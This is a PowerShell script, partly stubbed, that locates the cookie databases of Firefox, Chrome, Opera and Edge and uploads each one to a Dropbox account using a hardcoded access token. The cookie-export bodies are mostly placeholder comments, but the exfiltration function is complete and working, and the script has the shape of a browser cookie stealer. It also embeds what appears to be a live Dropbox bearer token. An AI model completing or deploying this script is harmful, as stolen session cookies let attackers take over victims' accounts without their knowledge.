# Function to export Firefox cookies
function Export-FirefoxCookies {
    # Your existing Firefox cookie export code here
}

# Function to export Chrome cookies
function Export-ChromeCookies {
    # Your existing Chrome cookie export code here
}

# Function to export Opera cookies
function Export-OperaCookies {
    $operaProfilePath = Join-Path -Path $env:APPDATA -ChildPath 'Opera Software\Opera Stable'
    $filePath = Join-Path -Path $operaProfilePath -ChildPath 'Cookies'
    # Your code to export Opera cookies here
}

# Function to export Edge cookies
function Export-EdgeCookies {
    $edgeProfilePath = Join-Path -Path $env:LOCALAPPDATA -ChildPath 'Microsoft\Edge\User Data\Default'
    $filePath = Join-Path -Path $edgeProfilePath -ChildPath 'Cookies'
    # Your code to export Edge cookies here
}

# Define Dropbox upload function
function UploadToDropbox {
    param (
        [string]$accessToken,
        [string]$dropboxFilePath,
        [byte[]]$fileContent
    )

    $uploadUrl = "https://content.dropboxapi.com/2/files/upload"

    $headers = @{}
    $headers.Add("Authorization", "Bearer $accessToken")
    $headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
    $headers.Add("Content-Type", "application/octet-stream")

    Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $fileContent
}

# Example usage
$accessToken = "sl.Bod_SO984BESh8RJihePQPKePMkyssVOt_KOCDU8ZOF105kK5-zIK9X95OieOhvNuP5zQaNBsquu_ODc0Q9LMQqXS5r0Lxnmg8xME2WRZRCN_ucAc8dDfz9OVJQpEkfuuuFAR4-i07klp-MOhYKCW7Y"

# Export Firefox cookies
Export-FirefoxCookies

# Export Chrome cookies
Export-ChromeCookies

# Export Opera cookies
Export-OperaCookies

# Export Edge cookies
Export-EdgeCookies

# Upload cookies to Dropbox
# Use the appropriate paths and file content for each browser
$dropboxFilePathFirefox = "/firefox_cookies.sqlite"
$dropboxFilePathChrome = "/chrome_cookies.sqlite"
$dropboxFilePathOpera = "/opera_cookies.sqlite"
$dropboxFilePathEdge = "/edge_cookies.sqlite"

# Upload Firefox cookies
UploadToDropbox -accessToken $accessToken -dropboxFilePath $dropboxFilePathFirefox -fileContent $firefoxCookieContent

# Upload Chrome cookies
UploadToDropbox -accessToken $accessToken -dropboxFilePath $dropboxFilePathChrome -fileContent $chromeCookieContent

# Upload Opera cookies
UploadToDropbox -accessToken $accessToken -dropboxFilePath $dropboxFilePathOpera -fileContent $operaCookieContent

# Upload Edge cookies
UploadToDropbox -accessToken $accessToken -dropboxFilePath $dropboxFilePathEdge -fileContent $edgeCookieContent
